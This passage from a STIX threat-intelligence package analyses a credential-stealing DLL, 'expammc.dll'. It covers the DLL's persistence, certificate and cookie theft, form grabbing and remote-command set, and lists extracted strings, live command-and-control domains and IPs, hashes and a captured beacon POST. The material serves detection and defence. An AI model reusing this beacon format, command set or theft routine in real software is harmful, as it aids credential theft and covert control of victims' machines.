+NOTE: The file name used in this procedure is always based on the Tick Count and the file is always created in the user's %temp% directory. This capability is performed in three ways. The first method indicates that the file to be created is a specific file due to the command line arguments being present. When the file is executed, the command statement is: "%temp%\[Tick Count].exe /fp [PID]". The second method is the same with the command line argument being omitted. The third method is the same as the second except entrenchment for the new file is achieved by writing the file path to the "\\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
+registry key.
+
+3. Reboot the victim host
+4. Open a local file and create a file mapping object
+5. Export any digital certificates present on the victim host
+
+This procedure carried out by creating a temporary directory in the %temp% directory. The name of the directory is based on the Tick Count and has the extension ".tmp". The DLL then attempts to enumerate the following certificate stores:
+My
+AddressBook
+AuthRoot
+CertificateAuthority
+Disallowed
+Root
+TrustedPeople
+TrustedPublisher
+If there are any certificates present, they are exported and written to a file in the .tmp directory. The DLL then creates a zip archive of the exported certificates and deletes the files from the .tmp directory.
+
+6. Clear Mozilla Firefox cache
+7. Enumerate, format and print the system time of the victim host
+8. Terminate all active threads and close the active socket
+
+The thread beginning at offset 0x10001E9F performs the following actions:
+The value extracted from the registry (s1) should contain an IP address and a port number is the format: [IP Address:port number]. The DLL creates a socket with the IP address via the specified port. Communication between the DLL and the remote host is carried out via this connection.
+
+There is a third code branch for the DLL to follow. This branch creates a new thread at offset 0x1000512C. This thread performs the following actions:
+The registry actions performed previously concerning the "k1" and "k2" value is performed again with the following data:
+Value: k1
+Data: 0x91be60b4
+
+Value: k2
+Data: 0x42e2e093
+
+Value: Version
+Data: 0x00000028
+
+The local host information is then enumerated by the DLL and formatted into the following string. The data contains the OS version, service pack number, architecture, and user account type. The file identifiers (ex: "&amp;win=") are hardcoded.
+"&amp;win=Microsoft Windows XP Professional Service Pack 3 (build: 2600)&amp;arch=x86 32bit&amp;user=Admin"
+
+OS: "Microsoft Windows XP Professional"
+SP: "Service Pack 3"
+Build: "build: 2600"
+Architecture: "arch=x86 32bit"
+User type: "Admin"
+
+The DLL replaces all the spaced in the string above with the character "+" (see below).
+"&amp;win=Microsoft+Windows+XP+Professional+Service+Pack+3+(build:+2600)&amp;arch=x86+32bit&amp;user=Admin"
+
+The following mutex is created:
+"Local\{2f37bdc2-e239-2644-16d3-aab7b87d6c01}"
+
+The following registry key is opened by the DLL and the data contained in the values "Data" and "Version" are queried:
+"HKEY_CURRENT_USER\SOFTWARE\AppDataLow\{e396a1ec-345b-ddfe-e045-144912bf6663}"
+
+The following strings are created by the DLL. The first is a beacon string and the second contains malware version information:
+"http://195.210.47.173/viewtopic.php?f=133&amp;t=10046&amp;sid5=4a6d929b282d292c453ddec119e4d26a"
+"user_id=2445172916&amp;version_id=40&amp;socks=0&amp;build=32940&amp;crc=00000000"
+
+The host information string and the DLL version information string are concatenated:
+	"user_id=2445172916&amp;version_id=40&amp;socks=0&amp;build=32940&amp;crc=00000000&amp;win=Microsoft+Windows+XP+Professional+Service+Pack+3+(build:+2600)&amp;arch=x86+32bit&amp;user=Admin"
+
+Any URL cache entries containing the IP address used by the DLL for network communication are deleted from the local host. This is achieved by enumerating the URL cache entries one at a time via the API's FindFirstUrlCacheEntryA and FindFirstUrlCacheEntryA. The DLL then parses each entry using the function StrStrIA. If the entry contains the IP address, it is deleted via DeleteUrlCacheEntry.
+
+This procedure contains the following functionality:
+1. Configuration updating
+2. Deletion of Mozilla Firefox Internet cache
+3. Reboot the victim host
+4. Shutdown the victim host
+5. Process enumeration
+
+PIPE USAGE
+This DLL uses a message-type pipe to send and receive data during execution. The data sent and received includes status messages and data to be sent over network connections.
+
+RELEVANT RESOURCE DATA
+Name: String
+Label: 7
+Content:
+STRINGTABLE
+LANGUAGE LANG_NEUTRAL, SUBLANG_NEUTRAL
+{
+101, "Their wall point school!"
+102, "Sought dark yours battle by pitch."
+103, "Factor on worker goes shut case."
+104, "Won on lying into We nails."
+105, "How grabbed speed from It read."
+106, "We, in live struggle said, title support?"
+107, "Into stomach without farm his into raw?"
+108, "Its on three!"
+109, "Meant my shook, feet cast."
+}
+Name: Version
+Label: 1
+Content:
+Length Of Struc: 0310h
+Length Of Value: 0034h
+Type Of Struc: 0000h
+Info: VS_VERSION_INFO
+Signature: FEEF04BDh
+Struc Version: 1.0
+File Version: 8.8.3.1
+Product Version: 8.8.3.1
+File Flags Mask: 0.63
+File Flags:
+File OS: NT (WINDOWS32)
+File Type: DLL
+File SubType: UNKNOWN
+File Date: 00:00:00 00/00/0000
+Struc has Child(ren). Size: 692 bytes.
+Child Type: StringFileInfo
+Language/Code Page: 0/1200
+CompanyName: Coretech
+FileDescription: After buy She broad gold production.
+FileVersion: 8,8,3,1
+InternalName: swim.DLL
+LegalCopyright: Copyright (C) 2009
+OriginalFilename: swim.DLL
+ProductName: After buy She broad gold production.
+ProductVersion: 8,8,3,1
+Child Type: VarFileInfo
+Translation: 0/1200
+Name: Dialog
+Label: 110
+Content:
+110 DIALOGEX 0, 0, 329, 223, 0
+STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | WS_POPUPWINDOW | WS_DLGFRAME
+CAPTION "Spread chose that."
+LANGUAGE LANG_NEUTRAL, SUBLANG_NEUTRAL
+FONT 8, "MS Shell Dlg"
+{
+AUTORADIOBUTTON "Dick income", 1001, 273, 187, 88, 10, NOT WS_TABSTOP
+EDITTEXT "", 1002, 249, 53, 46, 14, ES_AUTOHSCROLL
+PUSHBUTTON "film flies", 1003, 130, 65, 80, 14
+AUTOCHECKBOX "environment chart", 1004, 275, 166, 136, 10
+LTEXT "Without lay his completely towards earth!", -1, 186, 6, 328, 8
+AUTOCHECKBOX "addition adventure", 1005, 244, 15, 144, 10
+}
+Name: Icon Entry
+Label: 1-5
+Content: This file contains multiple icons including a white box containing "Abc", a gray computer tower, a satellite dish and a computer monitor, an orange box containing the letter "J" and a hand
+holding a globe.
+
+RELEVANT STRING DATA
+Me layers, sowed by only gasoline We needle with easily north factory Germany in card through temperature laid without development shape play at directly plant at August individual shut, across better out of obtain golden soft limited tune buffalo Johnson Russia under include compass effect mistaken fourth care pole stand are out of stole post mine, given for are force lent house put behind upward Dutch
+troops laid complete differ about cow particularly, lay private kept change Bill on, tall, excited money furniture, lead distant total raw comeoff common highway wind plate spell duck effect by darkness under made stove lake, salmon, column, get fix major stung part Andy habit tobacco small troops lost leader fully near bring from highest hand at mix become, place useful University, in leaving government so
+leader sing particles date at, seed smallest Pacific minute all by spend struck relationship break happened prepare wrote Frank stomach father lean better beginning Dick swim citizen hide wide easily castle order over build clothing went with alone itself life here disappear meet under is pure pool unit after everyone saw fair above reason orange ask happy save sat knowledge wool at felt, trace eaten
+plan pattern after burst under please whistle religious among France at hollow bought good catchup day declared slipped rise throw began driver have escape handle from orbit out of Bay noted Wilson sought enough, across say without pressure, to brass journey leant women day gasoline location under swung take battle copy from available square was car butter you grew at wire, brought pocket experiment, milk
+above blew pair began for type breakoff of plenty wound lips thy without it spilt rise potatoes song scientist Asia eaten, feet spill younger after curve! Their wall point school!"Sought dark yours battle by pitch. Factor on worker goes shut case. 
+Won on lying into We nails. 
+How grabbed speed from It read.)We, in live struggle said, title support?'Into stomach without farm his into raw?
+Its on three!
+Meant my shook, feet cast.
+
+RELEVANT STRING DATA
+=GET t!=PUT t
+=POSTt
+.pfx
+password
+Exported %u certs to file %s
+No certs found in "%S".
+Certs thread started.
+AddressBook
+AuthRoot
+CertificateAuthority
+Disallowed
+Root
+TrustedPeople
+TrustedPublisher
+Certs ended with status %u
+makumazna.com.tw
+parti.com.tw
+64.62.146.103
+195.191.56.242
+195.210.47.173
+Version
+Data
+FILE
+cert
+cook
+PR_Close
+PR_Write
+PR_Read
+NSPR4.DLL
+nspr4.DLL
+Content-Length: %u
+Content-Type
+text/html
+javascript
+json
+Content-Length
+: chunked
+Transfer-Encoding
+ocsp
+identity
+Accept-Encoding:
+If-Modified-Since:
+If-None-Match:
+gz=1
+\\?\
+Local\
+Makezip ended with status %u
+%s%0.8X%0.8X.tmp
+File "%s" added to send list.
+Add HANDLE To Send %0.8X
+\*.*
+Host
+User-Agent
+Software\Microsoft\Windows\CurrentVersion\Internet Settings
+User Agent
+gzip
+Accept-Encoding: identity
+Accept-Encoding:
+identity
+/viewtopic.php?f=%u&amp;t=%u&amp;sid5=%0.8x%0.8x%0.8x%0.8x
+http://%s%s
+user_id=%.4u&amp;version_id=%lu&amp;socks=%lu&amp;build=%lu&amp;crc=%.8x
+Connect to: %s
+Config load status: %u
+Config updated.
+Config update failed.
+Reply size error.
+Software\Microsoft\Internet Explorer\Main
+NoProtectedModeBanner
+TabProcGrowth
+Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3
+2500
+http://
+https://
+image/gif
+screen
+%.4u
+%user_id%
+%version_id%
+NEWGRAB
+grabs
+SCREENSHOT
+PROCESS
+HIDDEN
+http
+%%param_%s%%
+URL: %s
+user=%s&amp;pass=%s
+auth
+POST
+URL: %s
+form
+GetNativeSystemInfo
+&amp;win=
+Microsoft
+Windows Vista
+Windows Server 2008
+Windows 7
+Windows Server 2008 R2
+Windows Server 2003 R2,
+Windows Storage Server 2003
+Windows Home Server
+Windows XP Professional x64 Edition
+Windows Server 2003,
+Windows XP
+Home Edition
+Professional
+Windows 2000
+Datacenter Server
+Advanced Server
+Server
+(build: %d)
+64-bit
+32-bit
+Unknown
+&amp;arch=
+x64 (AMD or Intel)
+Intel Itanium-based
+x86 32bit
+&amp;user=
+Admin
+User
+URL: %s
+KEY: %s
+html
+%02u:%02u:%02u
+[PipesProcessCommand] SocksStart. Data: %s
+[PipesProcessCommand] SocksStart. Data: NULL
+[PipesProcessCommand] SocksStart Status = %u
+[PipesProcessCommand] SocksStop.
+/fp %lu
+iexplore.exe
+firefox.exe
+chrome.exe
+opera.exe
+safari.exe
+explorer.exe
+ExitProcess
+--------------------------%04x%04x%04x
+Content-Type: multipart/form-data; boundary=%s
+Content-Disposition: form-data; name="upload_file"; filename="%s"
+Content-Disposition: form-data; name="upload_file"; filename="%.4u.%lu"
+Content-Type: application/octet-stream
+--%s
+--%s
+Content-Disposition: form-data; name="%s"
+--%s--
+/posting.php?mode=post&amp;f=%u&amp;sid5=%0.8x%0.8x%0.8x%0.8x
+/posting.php?mode=reply&amp;f=%u&amp;sid5=%0.8x%0.8x%0.8x%0.8x
+FullURL "%s%s"
+file
+ProcessQueue: Flag %u, Size %u
+user_id=%.4u&amp;version_id=%lu&amp;%s=1
+noname
+Sending %u bytes of file "%s" of type "%s" to URL TYPE: %u
+Send file status: 0x%0.8X
+Sending %u bytes of type "%s" to URL TYPE: %u
+Send %s status: 0x%0.8X
+ProcessQueue: Status %0.8X
+GET
+Content-Type: application/x-www-form-urlencoded
+SOFTWARE\AppDataLow\
+\Vars
+\\.\pipe\
+\Microsoft\
+S:(ML;;NW;;;LW)
+D:(D;OICI;GA;;;BG)(D;OICI;GA;;;AN)(A;OICI;GA;;;AU)(A;OICI;GA;;;BA)
+\\.\%s
+%lu.exe
+Software\Microsoft\Windows\CurrentVersion\Run
+\Mozilla\Firefox\Profiles\
+cookies.sqlite
+cookies.sqlite-journal
+\Macromedia\Flash Player\
+*.sol
+*.txt
+\sols
+\cookie.ie
+\cookie.ff
+Cookies thread started.
+Cookies ended with status %u
+Received %s
+EXE
+DL_EXE
+DL_EXE_ST
+CLEAR_COOK
+VER
+REBOOT
+KILL
+GET_CERTS
+GET_COOKIES
+SOCKS_START
+[CMD] SocksStart: Status %u
+SOCKS_STOP
+[CMD] SocksStop: Status : %u
+GET_PROCLIST
+proc
+GET_LOG
+log
+ZwWow64ReadVirtualMemory64
+ntDLL.DLL
+.DLL
+IsWow64Process
+ZwWow64QueryInformationProcess64
+LoadLibraryA
+Wow64ApcRoutine
+wow64
+FreeLibrary
+open
+kernelbase
+ntDLL
+kernel32
+{%08x-%04x-%04x-%04x-%08x%04x}
+C:\tmp\NRM-21_06_12\PDB\client_x32.pdb</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-20b35bb6-c91a-4c2d-be96-69847ffc2963">
+        <cybox:Object id="CISCP:Object-bffe299f-5e62-4633-acc2-88d03bb731d8">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">expammc.dll</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">96256</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">9b0daff70b66acdbec1784877a717777</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">c540509d1289c6cf9e11cbe1e87274f3ddedb3a9</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">1536:cYOnnnnnnnGnnnnnYbmpVS6liUweFPS/AEWRz2uSiXnvzmDFqafawCzV6S88v4+0:cgpU6lnwex8WMuTXnvzOFqai9ZZ8yN22</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-09-27T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-2c445362-bdc1-42a8-a50c-116dba2adb07" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>In a third branch of code, the file "expammc.dll" creates a new thread.  The registry actions performed previously concerning the "k1" and "k2" values, are used to identify which remote host to communicate with. A URL string (beacon string) as well as another data string containing malware version information is appended to this domain and sent to the remote host via a POST request.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-5f80eb31-865e-4599-85ea-50c1f40d4fff">
+        <cybox:Object id="CISCP:Object-80a84ddc-b6c6-46c6-81e6-38dfd3cbe889">
+          <cybox:Properties type="Domain Name" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">makumazna.com.tw</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-09-27T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-fbee949b-a035-465e-ab17-212bb18a05bc" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>In a third branch of code, the file "expammc.dll" creates a new thread.  The registry actions performed previously concerning the "k1" and "k2" values, are used to identify which remote host to communicate with. A URL string (beacon string) as well as another data string containing malware version information is appended to this domain and sent to the remote host via a POST request.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-73912367-146e-45bc-b46c-276d87ab2a4f">
+        <cybox:Object id="CISCP:Object-18c0c654-4d35-468a-9160-6eaeb5d1c61b">
+          <cybox:Properties type="Domain Name" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">parti.com.tw</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-09-27T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-cbcee2c5-7f13-4efa-bb83-da67ff3badb9" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>In a third branch of code, the file "expammc.dll" creates a new thread.  The registry actions performed previously concerning the "k1" and "k2" values, are used to identify which remote host to communicate with. A URL string (beacon string) as well as another data string containing malware version information is appended to this IP address and sent to the remote host via a POST request.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-2e7dcd20-d39a-4cdd-90ea-6fd44e858c24">
+        <cybox:Object id="CISCP:Object-0362403e-69fb-4642-aa04-6f6986bc2b1b">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+            <AddrObj:Address_Value condition="Equals">64.62.146.103</AddrObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-09-27T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-badccf9a-9f88-4f64-9660-ab6ec5b03196" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>In a third branch of code, the file "expammc.dll" creates a new thread.  The registry actions performed previously concerning the "k1" and "k2" values, are used to identify which remote host to communicate with. A URL string (beacon string) as well as another data string containing malware version information is appended to this IP address and sent to the remote host via a POST request.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-a09213b2-3b9b-468e-ac53-7e109cc3740c">
+        <cybox:Object id="CISCP:Object-5a7d7d4b-cfbe-4256-86ac-1330fad7d4ae">
+          <cybox:Properties category="ipv4-addr" xsi:type="AddrObj:AddressObjectType">
+            <AddrObj:Address_Value condition="Equals">195.191.56.242</AddrObj:Address_Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-09-27T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-f0a5aa93-f669-4a3d-bfd1-68490310c7ba" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>In a third branch of code, the file "expammc.dll" creates a new thread.  The registry actions performed previously concerning the "k1" and "k2" values, are used to identify which remote host to communicate with. A URL string (beacon string) as well as another data string containing malware version information is appended to this IP address and sent to the remote host via a POST request.
+
+The following network activity was observed emanating from the file "expammc.dll" during analysis:
+POST /viewtopic.php?f=133&amp;t=10046&amp;sid5=4a6d929b282d292c453ddec119e4d26a HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Host: 195.210.47.173
+Content-Length: 158
+Connection: Keep-Alive
+Cache-Control: no-cache
+user_id=2445172916&amp;version_id=40&amp;socks=0&amp;build=32940&amp;crc=00000000&amp;win=Microsoft+Windows+XP+Professional+Service+Pack+3+(build:+2600)&amp;arch=x86+32bit&amp;user=Admin</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-3f5822ad-1d18-44ee-9e76-ebe42ffe6b84">
+        <cybox:Object id="CISCP:Object-fc4fe0e8-4e51-417b-8141-b68fe21c635f">
+          <cybox:Properties type="URL" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">http://195.210.47.173/viewtopic.php</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-09-27T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+  </stix:Indicators>
+  <stix:TTPs>
+    <stix:Kill_Chains>
+      <stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf">
+        <stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/>
+        <stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/>
+        <stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+        <stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/>
+        <stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+        <stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+        <stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/>
+      </stixCommon:Kill_Chain>
+    </stix:Kill_Chains>
+  </stix:TTPs>
+</stix:STIX_Package>
